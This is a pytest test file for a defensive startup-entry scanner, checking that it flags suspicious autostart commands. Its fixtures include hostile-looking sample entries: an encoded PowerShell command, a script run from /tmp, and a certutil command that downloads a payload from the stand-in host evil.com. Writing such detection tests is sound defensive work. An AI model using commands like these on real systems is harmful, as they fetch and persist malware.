"""Tests for scanners.startup_scanner — Startup Scanner."""

from __future__ import annotations

from unittest.mock import patch, MagicMock

import pytest

from core.config import AgentConfig
from scanners.startup_scanner import StartupScanner


@pytest.fixture
def scanner():
    return StartupScanner(AgentConfig())


class TestStartupScanner:

    def test_properties(self, scanner):
        assert scanner.name == "Startup Scanner"
        assert "all" in scanner.supported_platforms

    @patch("scanners.startup_scanner.load_os_module")
    def test_clean_startups_no_alerts(self, mock_loader, scanner):
        from os_modules.base import StartupEntry
        mock_module = MagicMock()
        mock_module.get_startup_entries.return_value = [
            StartupEntry(name="Defender", command="C:\\Windows\\Defender\\MSASCuiL.exe",
                         location="HKLM\\Run", enabled=True),
            StartupEntry(name="OneDrive", command="C:\\Users\\user\\OneDrive.exe",
                         location="HKCU\\Run", enabled=True),
        ]
        mock_loader.return_value = mock_module

        findings = scanner.scan()
        high_findings = [f for f in findings if f.severity.value in ("critical", "high")]
        assert len(high_findings) == 0

    @patch("scanners.startup_scanner.load_os_module")
    def test_suspicious_powershell_encoded(self, mock_loader, scanner):
        from os_modules.base import StartupEntry
        mock_module = MagicMock()
        mock_module.get_startup_entries.return_value = [
            StartupEntry(name="Update", command="powershell -enc SGVsbG8gV29ybGQ=",
                         location="HKCU\\Run", enabled=True),
        ]
        mock_loader.return_value = mock_module

        findings = scanner.scan()
        high_findings = [f for f in findings if f.severity.value in ("critical", "high")]
        assert len(high_findings) >= 1

    @patch("scanners.startup_scanner.load_os_module")
    def test_startup_from_temp_dir(self, mock_loader, scanner):
        from os_modules.base import StartupEntry
        mock_module = MagicMock()
        mock_module.get_startup_entries.return_value = [
            StartupEntry(name="malware", command="/tmp/evil.sh",
                         location="/etc/init.d", enabled=True),
        ]
        mock_loader.return_value = mock_module

        findings = scanner.scan()
        non_info = [f for f in findings if f.severity.value != "info"]
        assert len(non_info) >= 1

    @patch("scanners.startup_scanner.load_os_module")
    def test_certutil_urlcache_detected(self, mock_loader, scanner):
        from os_modules.base import StartupEntry
        mock_module = MagicMock()
        mock_module.get_startup_entries.return_value = [
            StartupEntry(name="Updater", command="certutil -urlcache -split -f http://evil.com/payload.exe",
                         location="HKLM\\Run", enabled=True),
        ]
        mock_loader.return_value = mock_module

        findings = scanner.scan()
        high_findings = [f for f in findings if f.severity.value in ("critical", "high")]
        assert len(high_findings) >= 1
